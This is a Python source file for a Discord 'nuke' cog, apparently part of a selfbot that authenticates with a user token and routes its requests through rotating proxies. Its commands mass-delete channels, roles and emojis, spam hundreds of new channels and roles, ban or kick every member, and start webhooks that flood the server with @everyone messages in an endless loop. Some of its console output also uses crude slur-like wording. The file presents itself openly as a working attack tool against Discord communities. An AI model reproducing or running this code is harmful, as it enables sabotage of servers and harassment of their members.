import discord, requests, json, random, time, threading, os
from discord.ext import commands
proxies = []
from pystyle import Colors, Colorate 
good_codes = [200, 201, 204]
proxy = open("proxies.txt").readlines()
for xd in proxy:
  finalproxy = xd.replace('\n', '')
  proxies.append(finalproxy)
with open("config.json", "r") as f:
    data = json.load(f)

icon = f"\u001b[37;1m[\u001b[30;1mC\u001b[0mP\u001b[37;1m]\u001B[0m"

class nuke(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.nukedguild = 0

    @commands.command(description="Enables webhooks (only works in guild which you send the command)")
    async def webhookset(self, ctx):
        self.nukedguild = ctx.guild.id
        await ctx.message.edit(content="Done",delete_after=1)

    @commands.command(description="Removes all the channels")
    async def cdel(self, ctx):
        await ctx.message.delete()
        for channel in ctx.guild.channels:
            threading.Thread(target=self.channelremover,args=(channel.id, channel.name,)).start()

    @commands.command(description="Removes all the roles")
    async def rdel(self, ctx):
        await ctx.message.delete()
        for role in ctx.guild.roles:
            threading.Thread(target=self.roleremover,args=(ctx.guild.id, role.id, role.name,)).start()

    @commands.command(description="Spams channels", usage="[amount] [name]")
    async def cspam(self, ctx, amount=250, *, name=random.choice(data["NUKES"]["CHANNEL NAMES"])):
        await ctx.message.delete()
        for i in range(amount):
            threading.Thread(target=self.channelcreator,args=(ctx.guild.id, name,)).start()

    @commands.command(description="Spams roles", usage="[amount] [name]")
    async def rspam(self, ctx, amount=100, *, name=random.choice(data["NUKES"]["ROLE NAMES"])):
        await ctx.message.delete()
        for i in range(amount):
            threading.Thread(target=self.rolecreator,args=(ctx.guild.id, name,)).start()
    
    @commands.command(description="Spams emojis (names customizable in config.json)")
    async def emojifuck(self, ctx):
        await ctx.message.delete()
        shit = []
        for stuff in os.listdir("nuke/emojis"):
            with open(f"nuke/emojis/{stuff}", "rb") as f:
                shit.append(f.read())
        print(f"{icon} Loaded {len(shit)} {'emoji' if len(shit) == 1 else 'emojis'}")
        for i in range(50):
            try:
                await ctx.guild.create_custom_emoji(name=random.choice(data["NUKES"]["EMOJI NAMES"]),image=random.choice(shit))
            except Exception as E:
                print(f"{icon} {E}")

    @commands.command(description="Deletes emojis")
    async def emojidel(self, ctx):
        await ctx.message.delete()
        for emoji in ctx.guild.emojis:
            threading.Thread(target=self.emojideleter,args=(ctx.guild.id,emoji.id,emoji.name,)).start()
      
    @commands.command(description="Bans people")
    async def massban(self, ctx):
        await ctx.message.delete()
        members = await ctx.guild.chunk()
        for member in members:
            threading.Thread(target=self.banMember,args=(ctx.guild.id, member.id, member.name,)).start()

    @commands.command(description="Kicks people")
    async def masskick(self, ctx):
        await ctx.message.delete()
        members = await ctx.guild.chunk()
        for member in members:
            threading.Thread(target=self.kickMember,args=(ctx.guild.id, member.id, member.name,)).start()
    
    @commands.Cog.listener()
    async def on_guild_channel_create(self, channel):
        if channel.guild.id == self.nukedguild and str(channel.type) == "text":
            webhook = await channel.create_webhook(name=f"CP")
            while True:
                await webhook.send(f"@everyone @here {random.choice(data['NUKES']['WEBHOOK MSGS'])}",username=random.choice(data['NUKES']["WEBHOOK NAMES"]))

    def channelremover(self, channel, name):
        while True:
            r = requests.delete(f"https://discord.com/api/v9/channels/{channel}",headers={"Authorization": data['TOKEN']},proxies={"http": random.choice(proxies)})
            if 'retry_after' in r.text:
                print(Colorate.Horizontal(Colors.blue_to_purple, "Channels got ratelimited." , 1))
            else:
                if r.status_code in good_codes:
                    print(Colorate.Horizontal(Colors.blue_to_purple, "Deleted a channel.", 1))
                    break
                else:
                    print(Colorate.Horizontal(Colors.blue_to_purple, "CP wasn't able to delete channel.", 1))
                    break

    def roleremover(self, guild, role, name):
        while True:
            r = requests.delete(f"https://ptb.discord.com/api/v9/guilds/{guild}/roles/{role}",headers={"Authorization": data['TOKEN']},proxies={"http": random.choice(proxies)})
            if 'retry_after' in r.text:
                print(Colorate.Horizontal(Colors.blue_to_purple, "Roles got rapelimited", 1))
            else:
                if r.status_code in good_codes:
                    print(Colorate.Horizontal(Colors.blue_to_purple, "Deleted a role.", 1))
                    break
                else:
                    print(Colorate.Horizontal(Colors.blue_to_purple, "CP wasn't able to delete role.", 1))
                    break

    def channelcreator(self, guild, name):
        while True:
            r = requests.post(f"https://ptb.discord.com/api/v9/guilds/{guild}/channels",headers={"Authorization": data['TOKEN']},proxies={"http": random.choice(proxies)},json={"nsfw": True, "name": name})
            if 'retry_after' in r.text:
                print(Colorate.Horizontal(Colors.blue_to_purple, "Channels got rapelimited.", 1))
            else:
                if r.status_code in good_codes:
                    print(Colorate.Horizontal(Colors.blue_to_purple, "Created a channel.", 1))
                    break
                else:
                    print(Colorate.Horizontal(Colors.blue_to_purple, "CP wasn't able to create channel.", 1))
                    break

    def rolecreator(self, guild, name):
        while True:
            r = requests.post(f"https://ptb.discord.com/api/v9/guilds/{guild}/roles",headers={"Authorization": data['TOKEN']},proxies={"http": random.choice(proxies)},json={"name": name, "color": random.randint(0, 16711680)})
            if 'retry_after' in r.text:
                print(Colorate.Horizontal(Colors.blue_to_purple, "Roles got rapelimited.", 1))
            else:
                if r.status_code in good_codes:
                    print(Colorate.Horizontal(Colors.blue_to_purple, "Created a role.", 1))
                    break
                else:
                    print(Colorate.Horizontal(Colors.blue_to_purple, "CP wasn't able to create role.", 1))
                    break

    def emojideleter(self, guild, emoji, name):
        while True:
            r = requests.delete(f"https://ptb.discord.com/api/v9/guilds/{guild}/emojis/{emoji}",headers={"Authorization": data['TOKEN']},proxies={"http": random.choice(proxies)})
            if 'retry_after' in r.text:
                print(Colorate.Horizontal(Colors.blue_to_purple, "Emojis got rapelimited.", 1))
            else:
                if r.status_code in good_codes:
                    print(Colorate.Horizontal(Colors.blue_to_purple, "Created an emoji.", 1))
                    break
                else:
                    print(Colorate.Horizontal(Colors.blue_to_purple, "CP wasn't able to create emoji.", 1))
                    break

    def banMember(self, guild, member, name):
        while True:
            r = requests.put(f"https://discord.com/api/v9/guilds/{guild}/bans/{member}",headers={"Authorization": data['TOKEN']},proxies={"http": random.choice(proxies)})
            if 'retry_after' in r.text:
                print(Colorate.Horizontal(Colors.blue_to_purple, "Bans got rapelimited.", 1))
            else:
                if r.status_code in good_codes:
                    print(Colorate.Horizontal(Colors.blue_to_purple, "Banned a person.", 1))
                    break
                else:
                    print(Colorate.Horizontal(Colors.blue_to_purple, "CP wasn't able to ban person.", 1))
                    break

    def kickMember(self, guild, member, name):
        while True:
            r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/members/{member}",headers={"Authorization": data['TOKEN']},proxies={"http": random.choice(proxies)})
            if 'retry_after' in r.text:
                print(Colorate.Horizontal(Colors.blue_to_purple, "Kicks got rapelimited.", 1))

            else:
                if r.status_code in good_codes:
                    print(Colorate.Horizontal(Colors.blue_to_purple, "kicked a person.", 1))
                    break
                else:
                    print(Colorate.Horizontal(Colors.blue_to_purple, "CP wasn't able to kick person.", 1))
                    break

def setup(bot):
    bot.add_cog(nuke(bot))